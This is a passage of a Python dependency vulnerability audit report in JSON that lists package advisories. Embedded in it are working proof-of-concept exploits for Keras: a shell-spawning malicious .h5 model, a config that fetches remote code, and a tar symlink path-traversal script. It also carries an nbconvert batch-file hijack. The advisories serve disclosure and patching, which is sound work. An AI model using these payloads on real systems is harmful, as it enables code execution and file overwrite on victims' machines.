on all links generated by typesetters. The former will harden the resilience of JupyterLab to extensions with lack of secure defaults in link rendering, and the latter will improve user experience by preventing accidental state loss when clicking on links rendered by LaTeX typesetters.  ### Impact  Since the official LaTeX typesetter extensions for JupyterLab: `jupyterlab-mathjax` (default), `jupyterlab-mathjax2` and `jupyterlab-katex` do not include the `target=_blank`, there is no impact for JupyterLab users.  ### Patches  JupyterLab 4.4.8  ### Workarounds  No workarounds are necessary.  ### References  None"}]}, {"name": "jupyterlab-pygments", "version": "0.1.2", "vulns": []}, {"name": "jupyterlab-server", "version": "2.27.3", "vulns": []}, {"name": "jupyterlab-widgets", "version": "1.0.0", "vulns": []}, {"name": "keras", "version": "3.10.0", "vulns": [{"id": "CVE-2025-8747", "fix_versions": ["3.11.0"], "aliases": ["GHSA-c9rc-mg46-23w3"], "description": "### Summary It is possible to bypass the mitigation introduced in response to [CVE-2025-1550](https://github.com/keras-team/keras/security/advisories/GHSA-48g7-3x6r-xfhp), when an untrusted Keras v3 model is loaded, even when \u201csafe_mode\u201d is enabled, by crafting malicious arguments to built-in Keras modules.  The vulnerability is exploitable on the default configuration and does not depend on user input (just requires an untrusted model to be loaded).  ### Impact  | Type   | Vector   |Impact| | -------- | ------- | ------- | |Unsafe deserialization |Client-Side (when loading untrusted model)|Arbitrary file overwrite. Can lead to Arbitrary code execution in many cases.|   ### Details  Keras\u2019 [safe_mode](https://www.tensorflow.org/api_docs/python/tf/keras/models/load_model) flag is designed to disallow unsafe lambda deserialization - specifically by rejecting any arbitrary embedded Python code, marked by the \u201c__lambda__\u201d class name. https://github.com/keras-team/keras/blob/v3.8.0/keras/src/saving/serialization_lib.py#L641 -  ``` if config[\"class_name\"] == \"__lambda__\":         if safe_mode:             raise ValueError(                 \"Requested the deserialization of a `lambda` object. \"                 \"This carries a potential risk of arbitrary code execution \"                 \"and thus it is disallowed by default. If you trust the \"                 \"source of the saved model, you can pass `safe_mode=False` to \"                 \"the loading function in order to allow `lambda` loading, \"                 \"or call `keras.config.enable_unsafe_deserialization()`.\"             ) ```  A fix to the vulnerability, allowing deserialization of the object only from internal Keras modules, was introduced in the commit [bb340d6780fdd6e115f2f4f78d8dbe374971c930](https://github.com/keras-team/keras/commit/bb340d6780fdd6e115f2f4f78d8dbe374971c930).   ``` package = module.split(\".\", maxsplit=1)[0] if package in {\"keras\", \"keras_hub\", \"keras_cv\", \"keras_nlp\"}: ```  However, it is still possible to exploit model loading, for example by reusing the internal Keras function `keras.utils.get_file`, and download remote files to an attacker-controlled location. This allows for arbitrary file overwrite which in many cases could also lead to remote code execution. For example, an attacker would be able to download a malicious `authorized_keys` file into the user\u2019s SSH folder, giving the attacker full SSH access to the victim\u2019s machine. Since the model does not contain arbitrary Python code, this scenario will not be blocked by \u201csafe_mode\u201d. It will bypass the latest fix since it uses a function from one of the approved modules (`keras`).  #### Example  The following truncated `config.json` will cause a remote file download from https://raw.githubusercontent.com/andr3colonel/when_you_watch_computer/refs/heads/master/index.js to the local `/tmp` folder, by sending arbitrary arguments to Keras\u2019 builtin function `keras.utils.get_file()` -  ```            {                 \"class_name\": \"Lambda\",                 \"config\": {                     \"arguments\": {                         \"origin\": \"https://raw.githubusercontent.com/andr3colonel/when_you_watch_computer/refs/heads/master/index.js\",                         \"cache_dir\":\"/tmp\",                         \"cache_subdir\":\"\",                         \"force_download\": true},                     \"function\": {                         \"class_name\": \"function\",                         \"config\": \"get_file\",                         \"module\": \"keras.utils\"                     }                 },  ```   ### PoC  1. Download [malicious_model_download.keras](https://drive.google.com/file/d/1gS2I6VTTRUwUq8gBoMmvTGaN0SX1Vr8F/view?usp=drive_link) to a local directory  2. Load the model -  ``` from keras.models import load_model model = load_model(\"malicious_model_download.keras\", safe_mode=True) ```  3. Observe that a new file `index.js` was created in the `/tmp` directory   ### Fix suggestions 1. Add an additional flag `block_all_lambda` that allows users to completely disallow loading models with a Lambda layer. 1. Audit the `keras`, `keras_hub`, `keras_cv`, `keras_nlp` modules and remove/block all \u201cgadget functions\u201d which could be used by malicious ML models. 1. Add an additional flag `lambda_whitelist_functions` that allows users to specify a list of functions that are allowed to be invoked by a Lambda layer  ### Credit  The vulnerability was discovered by Andrey Polkovnichenko of the JFrog Vulnerability Research"}, {"id": "CVE-2025-9906", "fix_versions": ["3.11.0"], "aliases": ["GHSA-36fq-jgmw-4r9c"], "description": "### Arbitrary Code Execution in Keras  Keras versions prior to 3.11.0 allow for arbitrary code execution when loading a crafted `.keras` model archive, even when `safe_mode=True`.  The issue arises because the archive\u2019s `config.json` is parsed before layer deserialization. This can invoke `keras.config.enable_unsafe_deserialization()`, effectively disabling safe mode from within the loading process itself. An attacker can place this call first in the archive and then include a `Lambda` layer whose function is deserialized from a pickle, leading to the execution of attacker-controlled Python code as soon as a victim loads the model file.  Exploitation requires a user to open an untrusted model; no additional privileges are needed. The fix in version 3.11.0 enforces safe-mode semantics *before* reading any user-controlled configuration and prevents the toggling of unsafe deserialization via the config file.  **Affected versions:** < 3.11.0 **Patched version:** 3.11.0  It is recommended to upgrade to version 3.11.0 or later and to avoid opening untrusted model files."}, {"id": "CVE-2025-9905", "fix_versions": ["3.11.3"], "aliases": ["GHSA-36rr-ww3j-vrjv"], "description": "**Note:** This report has already been discussed with the Google OSS VRP team, who recommended that I reach out directly to the Keras team. I\u2019ve chosen to do so privately rather than opening a public issue, due to the potential security implications. I also attempted to use the email address listed in your `SECURITY.md`, but received no response.  ---  ## Summary  When a model in the `.h5` (or `.hdf5`) format is loaded using the Keras `Model.load_model` method, the `safe_mode=True` setting is **silently** ignored without any warning or error. This allows an attacker to execute arbitrary code on the victim\u2019s machine with the same privileges as the Keras application. This report is specific to the `.h5`/`.hdf5` file format. The attack works regardless of the other parameters passed to `load_model` and does not require any sophisticated technique\u2014`.h5` and `.hdf5` files are simply not checked for unsafe code execution.  From this point on, I will refer only to the `.h5` file format, though everything equally applies to `.hdf5`.  ## Details  ### Intended behaviour  According to the official Keras documentation, `safe_mode` is defined as:  ``` safe_mode: Boolean, whether to disallow unsafe lambda deserialization. When safe_mode=False, loading an object has the potential to trigger arbitrary code execution. This argument is only applicable to the Keras v3 model format. Defaults to True. ``` I understand that the behavior described in this report is somehow **intentional**, as `safe_mode` is only applicable to `.keras` models.   However, in practice, this behavior is misleading for users who are unaware of the internal Keras implementation. `.h5` files can still be loaded seamlessly using `load_model` with `safe_mode=True`, and the absence of any warning or error creates a **false sense of security**. Whether intended or not, I believe silently ignoring a security-related parameter is not the best possible design decision. At a minimum, if `safe_mode` cannot be applied to a given file format, an explicit error should be raised to alert the user.  This issue is particularly critical given the widespread use of the `.h5` format, despite the introduction of newer formats.  As a small anecdotal test, I asked several of my colleagues what they would expect when loading a `.h5` file with `safe_mode=True`. None of them expected the setting to be **silently** ignored, even after reading the documentation. While this is a small sample, all of these colleagues are cybersecurity researchers\u2014experts in binary or ML security\u2014and regular participants in DEF CON finals. I was careful not to give any hints about the vulnerability in our discussion.  ### Technical Details  Examining the implementation of `load_model` in `keras/src/saving/saving_api.py`, we can see that the `safe_mode` parameter is completely ignored when loading `.h5` files. Here's the relevant snippet:  ```python def load_model(filepath, custom_objects=None, compile=True, safe_mode=True):     is_keras_zip = ...     is_keras_dir = ...     is_hf = ...      # Support for remote zip files     if (         file_utils.is_remote_path(filepath)         and not file_utils.isdir(filepath)         and not is_keras_zip         and not is_hf     ):         ...      if is_keras_zip or is_keras_dir or is_hf:         ...      if str(filepath).endswith((\".h5\", \".hdf5\")):         return legacy_h5_format.load_model_from_hdf5(             filepath, custom_objects=custom_objects, compile=compile         ) ```  As shown, when the file format is `.h5` or `.hdf5`, the method delegates to `legacy_h5_format.load_model_from_hdf5`, which does not use or check the `safe_mode` parameter at all.  ### Solution  Since the release of the new `.keras` format, I believe the simplest and most effective way to address this misleading behavior\u2014and to improve security in Keras\u2014is to have the `safe_mode` parameter raise an **explicit error** when `safe_mode=True` is used with `.h5`/`.hdf5` files. This error should be clear and informative, explaining that the legacy format does not support `safe_mode` and outlining the associated risks of loading such files.  I recognize this fix may have minor backward compatibility considerations.  If you confirm that you're open to this approach, I\u2019d be happy to open a PR that includes the missing check.   ## PoC  From the attacker\u2019s perspective, creating a malicious `.h5` model is as simple as the following:  ```python import keras  f = lambda x: (     exec(\"import os; os.system('sh')\"),     x, )  model = keras.Sequential() model.add(keras.layers.Input(shape=(1,))) model.add(keras.layers.Lambda(f)) model.compile()  keras.saving.save_model(model, \"./provola.h5\") ```  From the victim\u2019s side, triggering code execution is just as simple:  ```python import keras  model = keras.models.load_model(\"./provola.h5\", safe_mode=True) ```  That\u2019s all. The exploit occurs **during model loading**, with no further interaction required. The parameters passed to the method do not mitigate of influence the attack in any way.   As expected, the attacker can substitute the `exec(...)` call with any payload. Whatever command is used will execute with the same permissions as the Keras application.  ## Attack scenario  The attacker may distribute a malicious `.h5`/`.hdf5` model on platforms such as Hugging Face, or act as a malicious node in a federated learning environment. The victim only needs to load the model\u2014*even with* `safe_mode=True` that would give the illusion of security. No inference or further action is required, making the threat particularly stealthy and dangerous.  Once the model is loaded, the attacker gains the ability to execute arbitrary code on the victim\u2019s machine with the same privileges as the Keras process. The provided proof-of-concept demonstrates a simple shell spawn, but any payload could be delivered this way."}, {"id": "CVE-2025-12058", "fix_versions": ["3.12.0"], "aliases": ["GHSA-mq84-hjqx-cwf2"], "description": "The Keras.Model.load_model method, including when executed with the intended security mitigation safe_mode=True, is vulnerable to arbitrary local file loading and Server-Side Request Forgery (SSRF).   This vulnerability stems from the way the StringLookup layer is handled during model loading from a specially crafted .keras archive. The constructor for the StringLookup layer accepts a vocabulary argument that can specify a local file path or a remote file path.    *  Arbitrary Local File Read: An attacker can create a malicious .keras file that embeds a local path in the StringLookup layer's configuration. When the model is loaded, Keras will attempt to read the content of the specified local file and incorporate it into the model state (e.g., retrievable via get_vocabulary()), allowing an attacker to read arbitrary local files on the hosting system.     *  Server-Side Request Forgery (SSRF): Keras utilizes tf.io.gfile for file operations. Since tf.io.gfile supports remote filesystem handlers (such as GCS and HDFS) and HTTP/HTTPS protocols, the same mechanism can be leveraged to fetch content from arbitrary network endpoints on the server's behalf, resulting in an SSRF condition.   The security issue is that the feature allowing external path loading was not properly restricted by the safe_mode=True flag, which was intended to prevent such unintended data access."}, {"id": "CVE-2025-12060", "fix_versions": ["3.12.0"], "aliases": ["GHSA-hjqc-jx6g-rwp9"], "description": "## Summary  Keras's `keras.utils.get_file()` function is vulnerable to directory traversal attacks despite implementing `filter_safe_paths()`. The vulnerability exists because `extract_archive()` uses Python's `tarfile.extractall()` method without the security-critical `filter=\"data\"` parameter. A PATH_MAX symlink resolution bug occurs before path filtering, allowing malicious tar archives to bypass security checks and write files outside the intended extraction directory.  ## Details  ### Root Cause Analysis  **Current Keras Implementation** ```python # From keras/src/utils/file_utils.py#L121 if zipfile.is_zipfile(file_path):     # Zip archive.     archive.extractall(path) else:     # Tar archive, perhaps unsafe. Filter paths.     archive.extractall(path, members=filter_safe_paths(archive)) ```  ### The Critical Flaw  While Keras attempts to filter unsafe paths using `filter_safe_paths()`, this filtering happens after the tar archive members are parsed and before actual extraction. However, the PATH_MAX symlink resolution bug occurs during extraction, not during member enumeration.  **Exploitation Flow:** 1. **Archive parsing**: `filter_safe_paths()` sees symlink paths that appear safe 2. **Extraction begins**: `extractall()` processes the filtered members 3. **PATH_MAX bug triggers**: Symlink resolution fails due to path length limits 4. **Security bypass**: Failed resolution causes literal path interpretation 5. **Directory traversal**: Files written outside intended directory  ### Technical Details  The vulnerability exploits a known issue in Python's `tarfile` module where excessively long symlink paths can cause resolution failures, leading to the symlink being treated as a literal path. This bypasses Keras's path filtering because:  - `filter_safe_paths()` operates on the parsed tar member information - The PATH_MAX bug occurs during actual file system operations in `extractall()` - Failed symlink resolution falls back to literal path interpretation - This allows traversal paths like `../../../../etc/passwd` to be written  ### Affected Code Location  **File**: `keras/src/utils/file_utils.py`   **Function**: `extract_archive()` around line 121   **Issue**: Missing `filter=\"data\"` parameter in `tarfile.extractall()`  ## Proof of Concept ``` #!/usr/bin/env python3 import os, io, sys, tarfile, pathlib, platform, threading, time import http.server, socketserver  # Import Keras directly (not through TensorFlow) try:     import keras     print(\"Using standalone Keras:\", keras.__version__)     get_file = keras.utils.get_file except ImportError:     try:         import tensorflow as tf         print(\"Using Keras via TensorFlow:\", tf.keras.__version__)         get_file = tf.keras.utils.get_file     except ImportError:         print(\"Neither Keras nor TensorFlow found!\")         sys.exit(1)  print(\"=\" * 60) print(\"Keras get_file() PATH_MAX Symlink Vulnerability PoC\") print(\"=\" * 60) print(\"Python:\", sys.version.split()[0]) print(\"Platform:\", platform.platform())  root = pathlib.Path.cwd() print(f\"Working directory: {root}\")  # Create target directory for exploit demonstration exploit_dir = root / \"exploit\" exploit_dir.mkdir(exist_ok=True)  # Clean up any previous exploit files try:     (exploit_dir / \"keras_pwned.txt\").unlink() except FileNotFoundError:     pass  print(f\"\\n=== INITIAL STATE ===\") print(f\"Exploit directory: {exploit_dir}\") print(f\"Files in exploit/: {[f.name for f in exploit_dir.iterdir()]}\")  # Create malicious tar with PATH_MAX symlink resolution bug print(f\"\\n=== Building PATH_MAX Symlink Exploit ===\")  # Parameters for PATH_MAX exploitation comp = 'd' * (55 if sys.platform == 'darwin' else 247) steps = \"abcdefghijklmnop\"  # 16-step symlink chain path = \"\"  with tarfile.open(\"keras_dataset.tgz\", mode=\"w:gz\") as tar:     print(\"Creating deep symlink chain...\")          # Build the symlink chain that will exceed PATH_MAX during resolution     for i, step in enumerate(steps):         # Directory with long name         dir_info = tarfile.TarInfo(os.path.join(path, comp))         dir_info.type = tarfile.DIRTYPE         tar.addfile(dir_info)                  # Symlink pointing to that directory         link_info = tarfile.TarInfo(os.path.join(path, step))         link_info.type = tarfile.SYMTYPE         link_info.linkname = comp         tar.addfile(link_info)                  path = os.path.join(path, comp)                  if i < 3 or i % 4 == 0:  # Print progress for first few and every 4th             print(f\"  Step {i+1}: {step} -> {comp[:20]}...\")          # Create the final symlink that exceeds PATH_MAX     # This is where the symlink resolution breaks down     long_name = \"x\" * 254     linkpath = os.path.join(\"/\".join(steps), long_name)          max_link = tarfile.TarInfo(linkpath)     max_link.type = tarfile.SYMTYPE     max_link.linkname = (\"../\" * len(steps))     tar.addfile(max_link)          print(f\"\u2713 Created PATH_MAX symlink: {len(linkpath)} characters\")     print(f\"  Points to: {'../' * len(steps)}\")          # Exploit file through the broken symlink resolution     exploit_path = linkpath + \"/../../../exploit/keras_pwned.txt\"     exploit_content = b\"KERAS VULNERABILITY CONFIRMED!\\nThis file was created outside the cache directory!\\nKeras get_file() is vulnerable to PATH_MAX symlink attacks!\\n\"          exploit_file = tarfile.TarInfo(exploit_path)     exploit_file.type = tarfile.REGTYPE     exploit_file.size = len(exploit_content)     tar.addfile(exploit_file, fileobj=io.BytesIO(exploit_content))          print(f\"\u2713 Added exploit file via broken symlink path\")          # Add legitimate dataset content     dataset_content = b\"# Keras Dataset Sample\\nThis appears to be a legitimate ML dataset\\nimage1.jpg,cat\\nimage2.jpg,dog\\nimage3.jpg,bird\\n\"     dataset_file = tarfile.TarInfo(\"dataset/labels.csv\")     dataset_file.type = tarfile.REGTYPE     dataset_file.size = len(dataset_content)     tar.addfile(dataset_file, fileobj=io.BytesIO(dataset_content))          # Dataset directory     dataset_dir = tarfile.TarInfo(\"dataset/\")     dataset_dir.type = tarfile.DIRTYPE     tar.addfile(dataset_dir)  print(\"\u2713 Malicious Keras dataset created\")  # Comparison Test: Python tarfile with filter (SAFE) print(f\"\\n=== COMPARISON: Python tarfile with data filter ===\") try:     with tarfile.open(\"keras_dataset.tgz\", \"r:gz\") as tar:         tar.extractall(\"python_safe\", filter=\"data\")          files_after = [f.name for f in exploit_dir.iterdir()]     print(f\"\u2713 Python safe extraction completed\")     print(f\"Files in exploit/: {files_after}\")          # Cleanup     import shutil     if pathlib.Path(\"python_safe\").exists():         shutil.rmtree(\"python_safe\", ignore_errors=True)          except Exception as e:     print(f\"\u274c Python safe extraction blocked: {str(e)[:80]}...\")     files_after = [f.name for f in exploit_dir.iterdir()]     print(f\"Files in exploit/: {files_after}\")  # Start HTTP server to serve malicious archive class SilentServer(http.server.SimpleHTTPRequestHandler):     def log_message(self, *args): pass  def run_server():     with socketserver.TCPServer((\"127.0.0.1\", 8005), SilentServer) as httpd:         httpd.allow_reuse_address = True         httpd.serve_forever()  server = threading.Thread(target=run_server, daemon=True) server.start() time.sleep(0.3)  # Keras vulnerability test cache_dir = root / \"keras_cache\" cache_dir.mkdir(exist_ok=True) url = \"http://127.0.0.1:8005/keras_dataset.tgz\"  print(f\"\\n=== KERAS VULNERABILITY TEST ===\") print(f\"Testing: keras.utils.get_file() with extract=True\") print(f\"URL: {url}\") print(f\"Cache: {cache_dir}\") print(f\"Expected extraction: keras_cache/datasets/keras_dataset/\") print(f\"Exploit target: exploit/keras_pwned.txt\")  try:     # The vulnerable Keras call     extracted_path = get_file(         \"keras_dataset\",         url,         cache_dir=str(cache_dir),         extract=True     )     print(f\"\u2713 Keras extraction completed\")     print(f\"\u2713 Returned path: {extracted_path}\")      except Exception as e:     print(f\"\u274c Keras extraction failed: {e}\")     import traceback     traceback.print_exc()  # Vulnerability assessment print(f\"\\n=== VULNERABILITY RESULTS ===\") final_exploit_files = [f.name for f in exploit_dir.iterdir()] print(f\"Files in exploit directory: {final_exploit_files}\")  if \"keras_pwned.txt\" in final_exploit_files:     print(f\"\\n\ud83d\udea8 KERAS VULNERABILITY CONFIRMED! \ud83d\udea8\")          exploit_file = exploit_dir / \"keras_pwned.txt\"     content = exploit_file.read_text()     print(f\"Exploit file created: {exploit_file}\")     print(f\"Content:\\n{content}\")          print(f\"\ud83d\udd0d TECHNICAL DETAILS:\")     print(f\"   \u2022 Keras uses tarfile.extractall() without filter parameter\")     print(f\"   \u2022 PATH_MAX symlink resolution bug bypassed security checks\")     print(f\"   \u2022 File created outside intended cache directory\")     print(f\"   \u2022 Same vulnerability pattern as TensorFlow get_file()\")          print(f\"\\n\ud83d\udcca COMPARISON RESULTS:\")     print(f\"   \u2705 Python with filter='data': BLOCKED exploit\")     print(f\"   \u26a0\ufe0f  Keras get_file(): ALLOWED exploit\")      else:     print(f\"\u2705 No exploit files detected\")     print(f\"Possible reasons:\")     print(f\"   \u2022 Keras version includes security patches\")     print(f\"   \u2022 Platform-specific path handling prevented exploit\")     print(f\"   \u2022 Archive extraction path differed from expected\")  # Show what Keras actually extracted (safely) print(f\"\\n=== KERAS EXTRACTION ANALYSIS ===\") try:     if 'extracted_path' in locals() and pathlib.Path(extracted_path).exists():         keras_path = pathlib.Path(extracted_path)         print(f\"Keras extracted to: {keras_path}\")                  # Safely list contents         try:             contents = [item.name for item in keras_path.iterdir()]             print(f\"Top-level contents: {contents}\")                          # Count symlinks (indicates our exploit structure was created)             symlink_count = 0             for item in keras_path.iterdir():                 try:                     if item.is_symlink():                         symlink_count += 1                 except PermissionError:                     continue                          print(f\"Symlinks created: {symlink_count}\")             if symlink_count > 0:                 print(f\"\u2713 PATH_MAX symlink chain was extracted\")                          except PermissionError:             print(f\"Permission errors in extraction directory (expected with symlink corruption)\")              except Exception as e:     print(f\"Could not analyze Keras extraction: {e}\")  print(f\"\\n=== REMEDIATION ===\") print(f\"To fix this vulnerability, Keras should use:\") print(f\"```python\") print(f\"tarfile.extractall(path, filter='data')  # Safe\") print(f\"```\") print(f\"Instead of:\") print(f\"```python\")  print(f\"tarfile.extractall(path)  # Vulnerable\") print(f\"```\")  # Cleanup print(f\"\\n=== CLEANUP ===\") try:     os.unlink(\"keras_dataset.tgz\")     print(f\"\u2713 Removed malicious tar file\") except:     pass  print(\"PoC completed!\")  ``` ### Environment Setup - **Python**: 3.8+ (tested on multiple versions) - **Keras**: Standalone Keras or TensorFlow.Keras - **Platform**: Linux, macOS, Windows (path handling varies)  ### Exploitation Steps  1. **Create malicious tar archive** with PATH_MAX symlink chain 2. **Host archive** on accessible HTTP server 3. **Call `keras.utils.get_file()`** with `extract=True` 4. **Observe directory traversal** - files written outside cache directory  ### Key Exploit Components  - **Deep symlink chain**: 16+ nested symlinks with long directory names - **PATH_MAX overflow**: Final symlink path exceeding system limits - **Traversal payload**: Relative path traversal (`../../../target/file`) - **Legitimate disguise**: Archive contains valid-looking dataset files  ### Demonstration Results  **Vulnerable behavior:** - Files extracted outside intended `cache_dir/datasets/` location - Security filtering bypassed completely - No error or warning messages generated  **Expected secure behavior:** - Extraction blocked or confined to cache directory - Security warnings for suspicious archive contents  ## Impact  ### Vulnerability Classification - **Type**: Directory Traversal / Path Traversal (CWE-22) - **Severity**: High - **CVSS Components**: Network accessible, no authentication required, impacts confidentiality and integrity  ### Who Is Impacted  **Direct Impact:** - Applications using `keras.utils.get_file()` with `extract=True` - Machine learning pipelines downloading and extracting datasets - Automated ML training systems processing external archives  **Attack Scenarios:** 1. **Malicious datasets**: Attacker hosts compromised ML dataset 2. **Supply chain**: Legitimate dataset repositories compromised 3. **Model poisoning**: Extraction writes malicious files alongside training data 4. **System compromise**: Configuration files, executables written to system directories  **Affected Environments:** - Research environments downloading public datasets - Production ML systems with automated dataset fetching - Educational platforms using Keras for tutorials - CI/CD pipelines training models with external data  ### Risk Assessment  **High Risk Factors:** - Common usage pattern in ML workflows - No user awareness of extraction security - Silent failure mode (no warnings) - Cross-platform vulnerability  **Potential Consequences:** - Arbitrary file write on target system - Configuration file tampering - Code injection via overwritten scripts - Data exfiltration through planted files - System compromise in containerized environments  ## Recommended Fix  ### Immediate Mitigation  Replace the vulnerable extraction code with:  ```python # Secure implementation if zipfile.is_zipfile(file_path):     # Zip archive - implement similar filtering     archive.extractall(path, members=filter_safe_paths(archive)) else:     # Tar archive with proper security filter     archive.extractall(path, members=filter_safe_paths(archive), filter=\"data\") ```  ### Long-term Solution  1. **Add `filter=\"data\"` parameter** to all `tarfile.extractall()` calls 2. **Implement comprehensive path validation** before extraction 3. **Add extraction logging** for security monitoring 4. **Consider sandboxed extraction** for untrusted archives 5. **Update documentation** to warn about archive security risks  ### Backward Compatibility  The fix maintains full backward compatibility as `filter=\"data\"` is the recommended secure default for Python 3.12+.  ## References  - [[Python tarfile security documentation](https://docs.python.org/3/library/tarfile.html#extraction-filters)](https://docs.python.org/3/library/tarfile.html#extraction-filters) - [[CVE-2007-4559](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559)](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-4559) - Related tarfile vulnerability - [[OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)](https://owasp.org/www-community/attacks/Path_Traversal)  Note: Reported in Huntr as well, but didn't get response https://huntr.com/bounties/f94f5beb-54d8-4e6a-8bac-86d9aee103f4"}, {"id": "CVE-2026-0897", "fix_versions": ["3.12.1", "3.13.1"], "aliases": ["GHSA-xfhx-r7ww-5995"], "description": "Allocation of Resources Without Limits or Throttling in the HDF5 weight loading component\u00a0in Google\u00a0Keras\u00a03.0.0 through 3.12.0 and 3.13.0\u00a0on all platforms\u00a0allows a remote attacker\u00a0to cause a Denial of Service (DoS) through memory exhaustion and a crash of the Python interpreter\u00a0via a crafted .keras archive containing a valid model.weights.h5 file whose dataset declares an extremely large shape."}, {"id": "CVE-2026-1669", "fix_versions": [], "aliases": ["GHSA-gfmx-qqqh-f38q"], "description": "Arbitrary file read in the model loading mechanism (HDF5 integration) in Keras versions 3.0.0 through 3.13.1 on all supported platforms allows a remote attacker to read local files and disclose sensitive information via a crafted .keras model file utilizing HDF5 external dataset references."}]}, {"name": "keyring", "version": "24.3.1", "vulns": []}, {"name": "kiwisolver", "version": "1.4.4", "vulns": []}, {"name": "langcodes", "version": "3.5.0", "vulns": []}, {"name": "language-data", "version": "1.3.0", "vulns": []}, {"name": "lazy-loader", "version": "0.4", "vulns": []}, {"name": "lazy-object-proxy", "version": "1.10.0", "vulns": []}, {"name": "lckr-jupyterlab-variableinspector", "version": "3.1.0", "vulns": []}, {"name": "libarchive-c", "version": "5.1", "vulns": []}, {"name": "libclang", "version": "18.1.1", "vulns": []}, {"name": "libmambapy", "skip_reason": "Dependency not found on PyPI and could not be audited: libmambapy (1.5.8)"}, {"name": "librosa", "version": "0.11.0", "vulns": []}, {"name": "license-expression", "version": "30.4.4", "vulns": []}, {"name": "linkify-it-py", "version": "2.0.0", "vulns": []}, {"name": "llvmlite", "version": "0.43.0", "vulns": []}, {"name": "lmdb", "version": "1.4.1", "vulns": []}, {"name": "locket", "version": "1.0.0", "vulns": []}, {"name": "lxml", "version": "5.2.1", "vulns": []}, {"name": "lz4", "version": "4.3.2", "vulns": []}, {"name": "marisa-trie", "version": "1.2.1", "vulns": []}, {"name": "markdown", "version": "3.4.1", "vulns": []}, {"name": "markdown-it-py", "version": "3.0.0", "vulns": []}, {"name": "markdown-pdf", "version": "1.10", "vulns": []}, {"name": "markupsafe", "version": "2.1.3", "vulns": []}, {"name": "matplotlib", "version": "3.10.0", "vulns": []}, {"name": "matplotlib-inline", "version": "0.1.6", "vulns": []}, {"name": "mccabe", "version": "0.7.0", "vulns": []}, {"name": "mdit-py-plugins", "version": "0.3.0", "vulns": []}, {"name": "mdurl", "version": "0.1.0", "vulns": []}, {"name": "menuinst", "skip_reason": "Dependency not found on PyPI and could not be audited: menuinst (2.1.2)"}, {"name": "mistune", "version": "2.0.4", "vulns": []}, {"name": "mkl-fft", "skip_reason": "Dependency not found on PyPI and could not be audited: mkl-fft (1.3.10)"}, {"name": "mkl-random", "skip_reason": "Dependency not found on PyPI and could not be audited: mkl-random (1.2.7)"}, {"name": "mkl-service", "version": "2.4.0", "vulns": []}, {"name": "ml-dtypes", "version": "0.3.2", "vulns": []}, {"name": "mlxtend", "version": "0.23.4", "vulns": []}, {"name": "more-itertools", "version": "10.3.0", "vulns": []}, {"name": "mpmath", "version": "1.3.0", "vulns": []}, {"name": "msgpack", "version": "1.0.3", "vulns": []}, {"name": "multidict", "version": "6.0.4", "vulns": []}, {"name": "multipledispatch", "version": "0.6.0", "vulns": []}, {"name": "murmurhash", "version": "1.0.12", "vulns": []}, {"name": "mypy", "version": "1.11.2", "vulns": []}, {"name": "mypy-extensions", "version": "1.0.0", "vulns": []}, {"name": "namex", "version": "0.1.0", "vulns": []}, {"name": "narrative-assistant", "skip_reason": "Dependency not found on PyPI and could not be audited: narrative-assistant (0.10.0)"}, {"name": "navigator-updater", "skip_reason": "Dependency not found on PyPI and could not be audited: navigator-updater (0.5.1)"}, {"name": "nbclient", "version": "0.8.0", "vulns": []}, {"name": "nbconvert", "version": "7.16.4", "vulns": [{"id": "CVE-2025-53000", "fix_versions": ["7.17.0"], "aliases": ["GHSA-xm59-rqc7-hhvf"], "description": "### Summary  On Windows, converting a notebook containing SVG output to a PDF results in unauthorized code execution. Specifically, a third party can create a `inkscape.bat` file that defines a [Windows batch script](https://en.wikipedia.org/wiki/Batch_file), capable of arbitrary code execution.  When a user runs `jupyter nbconvert --to pdf` on a notebook containing SVG output to a PDF on a Windows platform from this directory, the `inkscape.bat` file is run unexpectedly.  ### Details _Give all details on the vulnerability. Pointing to the incriminated source code is very helpful for the maintainer._  `nbconvert` searches for an `inkscape` executable when converting notebooks to PDFs here: https://github.com/jupyter/nbconvert/blob/4f61702f5c7524d8a3c4ac0d5fc33a6ac2fa36a7/nbconvert/preprocessors/svg2pdf.py#L104  The MITRE page on [CWE-427 (Uncontrolled Search Path Element)](https://cwe.mitre.org/data/definitions/427.html) summarizes the root cause succinctly:  > In Windows-based systems, when the `LoadLibrary` or `LoadLibraryEx` function is called with a DLL name that does not contain a fully qualified path, the function follows a search order that includes two path elements that might be uncontrolled: > - the directory from which the program has been loaded > - the current working directory  ### PoC  _Complete instructions, including specific configuration details, to reproduce the vulnerability._  1. Create a directory containing:       - A hidden bat file called `inkscape.bat` containing `msg * \"You've been hacked!\"`      - A dummy ipynb file called `Machine_Learning.ipynb`  2. Run the command `jupyter nbconvert --to pdf Machine_Learning.ipynb`.  3. Wait a few seconds, and you should see a popup showing the message \"You've been hacked!\"   ### Impact  All Windows users."}]}, {"name": "nbformat", "version": "5.10.4", "vulns": []}, {"name": "nest-asyncio", "version": "1.6.0", "vulns": []}, {"name": "networkx", "version": "3.3", "vulns": []}, {"name": "nltk", "version": "3.9.1", "vulns": []}, {"name": "nodeenv", "version": "1.10.0", "vulns": []}, {"name": "notebook", "version": "7.2.2", "vulns": []}, {"name": "notebook-shim", "version": "0.2.3", "vulns": []}, {"name": "numba", "version": "0.60.0", "vulns": []}, {"name": "numexpr", "version": "2.8.7", "vulns": []}, {"name": "numpy", "version": "1.26.4", "vulns": []}, {"name": "numpydoc", "version": "1.7.0", "vulns": []}, {"name": "openpyxl", "version": "3.1.5", "vulns": []}, {"name": "opt-einsum", "version": "3.4.0", "vulns": []}, {"name": "optree", "version": "0.16.0", "vulns": []}, {"name": "overrides", "version": "7.4.0", "vulns": []}, {"name": "packageurl-python", "version": "0.17.6", "vulns": []}, {"name": "packaging", "version": "24.1", "vulns": []}, {"name": "pandas", "version": "3.0.0", "vulns": []}, {"name": "pandocfilters", "version": "1.5.0", "vulns": []}, {"name": "panel", "version": "1.5.2", "vulns": []}, {"name": "param", "version": "2.1.1", "vulns": []}, {"name": "paramiko", "version": "2.8.1", "vulns": [{"id": "PYSEC-2022-166", "fix_versions": ["2.9.3", "2.10.1"], "aliases": ["GHSA-f8q4-jwww-x3wv", "CVE-2022-24302"], "description": "In Paramiko before 2.10.1, a race condition (between creation and chmod) in the write_private_key_file function could allow unauthorized information disclosure."}, {"id": "CVE-2023-48795", "fix_versions": ["3.4.0"], "aliases": ["GHSA-45x7-px36-x8w8", "GO-2023-2402"], "description": "### Summary  